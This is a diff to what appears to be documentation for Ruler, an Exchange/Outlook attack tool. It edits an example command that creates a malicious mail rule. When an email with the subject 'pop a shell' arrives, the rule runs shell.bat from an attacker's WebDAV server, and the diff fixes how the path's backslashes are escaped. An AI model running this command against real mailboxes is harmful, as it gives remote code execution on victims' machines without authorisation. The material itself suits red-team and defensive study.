@@ -129,11 +129,11 @@ Now the fun part. Your initial setup is the same as outlined in the [Silentbreak
 To create the new rule user Ruler and:
 
 ```
-./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -loc "\\yourserver\webdav\shell.bat" -trigger "pop a shell" -rule maliciousrule
+./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -loc "\\\\yourserver\\webdav\\shell.bat" -trigger "pop a shell" -rule maliciousrule
 ```
 
 The various parts:
-* `-loc` _this is the location of your remote shell (or c:/Windows/system32/calc.exe)_
+* `-loc` _this is the location of your remote shell *note the double slashes* (or c:/Windows/system32/calc.exe)_ 
 * `-trigger` _the string within the subject you want to trigger the rule_
 * `-rule` _a name for your rule_
 
